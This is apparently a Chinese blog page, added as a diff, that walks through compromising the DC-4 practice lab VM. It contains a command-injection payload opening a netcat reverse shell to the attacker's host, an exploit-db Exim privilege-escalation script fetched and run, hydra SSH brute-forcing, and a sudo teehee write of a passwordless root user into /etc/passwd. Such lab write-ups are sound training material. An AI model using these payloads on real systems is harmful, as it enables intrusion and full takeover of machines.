@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>dc-4 | jujub3</title>
+    <meta name="author" content="jujub3" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/head.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>JUJUB3</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags/THM">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;JUJUB3</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags/THM">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>dc-4</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/4
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/DC/" style="color: #00a596">
+                    DC
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>信息收集</p>
+<span id="more"></span>
+
+<p><img src="/../dc-4/1735200523635-b8231a2d-b489-4de0-8630-0d2e9a7b6ff4.png" alt="img"></p>
+<p>得到目标靶机的mac地址（网络设备的硬件地址，用于标识设备在局域网 即  LAN 中的唯一性）</p>
+<p>mac地址：00:0C:29:CC:EF:0E</p>
+<p>使用命令扫描： arp-scan -l</p>
+<p>得到ip：192.168.3.2</p>
+<p><img src="/../dc-4/1735201238137-5a50ff96-04d4-4f1f-979d-fcb4e8478bd6.png" alt="img"></p>
+<p>使用namp进行扫描：</p>
+<p>nmap -A 192.168.3.2 -p 1-65535 -oN nmap.A </p>
+<p>-A： 启用高级扫描功能，包括操作系统检测、服务版本检测、脚本扫描和路由跟踪  </p>
+<p>192.168.3.2：目标主机的ip地址</p>
+<p>-p 1-65535：扫描主机的所有端口，从1-65535</p>
+<p>-oN nmap.A：将扫描结果以普通文本的格式保存到nmap.A中</p>
+<p><img src="/../dc-4/1735201645071-be4e0cd1-efd5-4f2b-a2e2-62a41dda6e67.png" alt="img"></p>
+<p>开启了80端口的http服务，直接访问，只是一个登录框，<img src="/../dc-4/1735202729180-1c782882-c97e-408b-8b39-a0d4f7e5345f.png" alt="img"></p>
+<p>用whatweb -v 查看是不是常用的cms（ 内容管理系统  ）</p>
+<p><img src="/../dc-4/1735202804446-19c05b88-a821-4072-818b-7ff5e811183e.png" alt="img"></p>
+<p>并没有什么有用的信息，用dirsearch进行目录爆破<img src="/../dc-4/1735203066192-6179160c-51c5-4c52-84ef-bb5dfa9cdf66.png" alt="img"></p>
+<p>结果基本上都重定向到index.php了。</p>
+<p>尝试爆破，最后得到密码为happy<img src="/../dc-4/1735203845278-46c026da-1fe9-46d9-9e8d-e358cdf1b652.png" alt="img"></p>
+<p>抓包可以看到执行命令的参数</p>
+<p><img src="/../dc-4/1735205004013-85fbd04a-29ed-4f6d-9e76-16260fe79128.png" alt="img"></p>
+<p>发现可以执行我们设置的命令</p>
+<p><img src="/../dc-4/1735205113570-2a6d0929-5b6e-404a-adfe-3e94ca2e06f9.png" alt="img"></p>
+<p>这里直接反弹shell，kali开启端口监听</p>
+<p>nc -lvvp 8888</p>
+<p>修改数据包</p>
+<p>radio&#x3D;nc 192.168.3.9 8888 -e &#x2F;bin&#x2F;bash&amp;submit&#x3D;Run<img src="/../dc-4/1735205880143-e197582a-65fd-4ed8-a5c2-fdf1208150d7.png" alt="img"></p>
+<p>成功反弹shell</p>
+<p><img src="/../dc-4/1735205912064-8a13763f-49bc-490b-9874-bf5910a510e3.png" alt="img"></p>
+<p>获取交互式页面（其实相对于shell就是方便，美观，稳定）</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p><img src="/../dc-4/1735206423214-06fca803-ca6f-4e77-b088-c783bb30027e.png" alt="img"></p>
+<p>查看当前权限：whoami</p>
+<p><img src="/../dc-4/1735210591305-6201dceb-1c21-4b0a-a056-bf182413b860.png" alt="img"></p>
+<p>不是root权限</p>
+<h2 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h2><p>查看具有suid权限的命令</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="/../dc-4/1735210714975-2936b489-1990-4c2b-a8a1-0295e214bbe4.png" alt="img"></p>
+<p>发现一个 &#x2F;usr&#x2F;sbin&#x2F;exim4</p>
+<p>exim4：用于处理电子邮件的发送，接收和路由	</p>
+<p>查看exim4版本：<br>exim4 –version</p>
+<p><img src="/../dc-4/1735211779525-6c1b3e35-42a5-4965-821a-c2a3ee818da4.png" alt="img"></p>
+<p>查看本地漏洞库</p>
+<p><img src="/../dc-4/1735211932983-38d432f1-232c-4d3a-9f2c-c4378e574e44.png" alt="img"></p>
+<p>因为版本为:4.89</p>
+<p>所以选择这个：Exim 4.87 - 4.91 - Local Privilege Escalation                           | linux&#x2F;local&#x2F;46996.sh</p>
+<p>启动kali的apache服务</p>
+<p>systemctl start apache2.service  </p>
+<p>将kali本地漏洞库的脚本复制到apache服务的web页面下</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;46996.sh &#x2F;var&#x2F;www&#x2F;html</p>
+<p>可以看到本地访问的结果了</p>
+<p><img src="/../dc-4/1735215061141-df0e2292-09f4-4926-8b93-7b905e90d158.png" alt="img"></p>
+<p>在目标靶机中将这个脚本下载下来</p>
+<p><img src="/../dc-4/1735215116190-afe7ca62-abb0-42b9-bf0e-be2a0b6bd845.png" alt="img"></p>
+<p>显示文件夹权限不够，ls-l 查看只有读跟执行的权限。</p>
+<p><img src="/../dc-4/1735215263246-840d907a-ddd4-4934-aa41-386bd4c3fe7b.png" alt="img"></p>
+<p>在根目录发现有个可写的tmp目录<img src="/../dc-4/1735215362058-dae9fa7e-cb88-4327-b068-38c2a6ca219d.png" alt="img"></p>
+<p>于是就在&#x2F;tmp这个目录下载kali服务的脚本</p>
+<p><img src="/../dc-4/1735215463855-8fc15d85-1799-4a34-90a1-6f1c1dcdca4d.png" alt="img"></p>
+<p>然后给与可执行权限（+x）</p>
+<p>chmod +x 46996.sh</p>
+<p>然后执行脚本</p>
+<p>.&#x2F;46996.sh</p>
+<p>等脚本执行完后发现已经是root权限了</p>
+<p><img src="/../dc-4/1735215691246-8af63f85-e31e-4f23-92a2-28c298367ec2.png" alt="img"></p>
+<p>然后进入到root目录就可以拿到flag了</p>
+<p><img src="/../dc-4/1735215857021-85afaa22-5c02-4d44-8e48-ba0090f370e0.png" alt="img"></p>
+<h2 id="第二种解法（teehee提权）"><a href="#第二种解法（teehee提权）" class="headerlink" title="第二种解法（teehee提权）"></a>第二种解法（teehee提权）</h2><p>进入到home目录，发现有三个账户，最后只有jim里有东西</p>
+<p>然后在backups里发现一个备份文件，因为文件名有password所以猜测是一个储存密码的文件。</p>
+<p>因为前面开了ssh，所以尝试用hydra爆破ssh</p>
+<p>用法：</p>
+<p>hydra -l <username> -P <password_file> ssh:&#x2F;&#x2F;<target_ip></p>
+<p>在kali本地桌面创建一个passwd.txt用来存储.bak备份文件的内容</p>
+<p>命令：</p>
+<p>hydra -l jim -P passwd.txt 192.168.3.2 ssh</p>
+<p><img src="/../dc-4/1735217007554-09f8486c-9ad2-49b6-9bba-5bccdded3dd3.png" alt="img"></p>
+<p>然后通过ssh连接jim</p>
+<p>ssh <a href="mailto:&#106;&#105;&#x6d;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x33;&#46;&#x32;">jim@192.168.3.2</a></p>
+<p>jibril04</p>
+<p><img src="/../dc-4/1735217172878-9880a29c-c887-48cd-87ee-b2e9ab3dc767.png" alt="img"></p>
+<p>然后发现jim里有一封邮件</p>
+<p><img src="/../dc-4/1735217298258-c19a92dc-ad27-43bc-a45a-960aff3d56f2.png" alt="img"></p>
+<p>进入邮件目录：cd &#x2F;var&#x2F;spool&#x2F;mail</p>
+<p>可以看到一封来自charles的邮件，里面提供了charles的密码：^xHhA&amp;hvim0y</p>
+<p><img src="/../dc-4/1735217387788-b9f96feb-bd58-429c-b18e-f3cf56ef95d8.png" alt="img"></p>
+<p>然后直接通过su charles切换用户，输入密码</p>
+<p><img src="/../dc-4/1735217627107-aa3568f7-f988-49e3-ba0a-0292c0cc236a.png" alt="img"></p>
+<p>查看当前用户在系统中可以通过sudo命令执行的权限和规则</p>
+<p>sudo -l</p>
+<p><img src="/../dc-4/1735217817734-154178d2-88ec-4320-9bdf-e39acfe8078c.png" alt="img"></p>
+<p>发现在charles当中的sudo -l 命令中存在以root权限执行的命令</p>
+<p>teehee –help，查看用法</p>
+<p><img src="/../dc-4/1735218315455-b9070e89-c04d-4f43-96bb-8131814f71b5.png" alt="img"></p>
+<p>发现一个  -a用法，利用这点，可以直接向etc&#x2F;passwd中写入一些东西</p>
+<p><img src="/../dc-4/1735218445900-1e808523-05fa-4ca3-b6ef-bb88c2a00966.png" alt="img"></p>
+<p>利用管道符（  |  ）写入：admin::0:0:::&#x2F;bin&#x2F;bash</p>
+<pre><code class="language-plain">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd admin::0:0:::/bin/bash
+# 用户名admin 没有密码,第一个0表示超级用户，管理员权限 进入的时候运行/bin/bash
+</code></pre>
+<p>直接切换admin用户，无需密码，因为前面添加的时候没有设置密码</p>
+<p><img src="/../dc-4/1735219231147-dc724656-281d-44db-9139-0c80bd5affdb.png" alt="img"></p>
+<p>可以看到直接为root权限了，最后进入root目录，拿到flag<img src="/../dc-4/1735219284642-c2298a33-e992-476e-9f8e-57e22252ffd5.png" alt="img"></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 jujub3
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;jujub3
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="jujub3/jujub3.github.io"
+    data-repo-id="R_kgDOOQ-ONw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOOQ-ON84ComAd"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
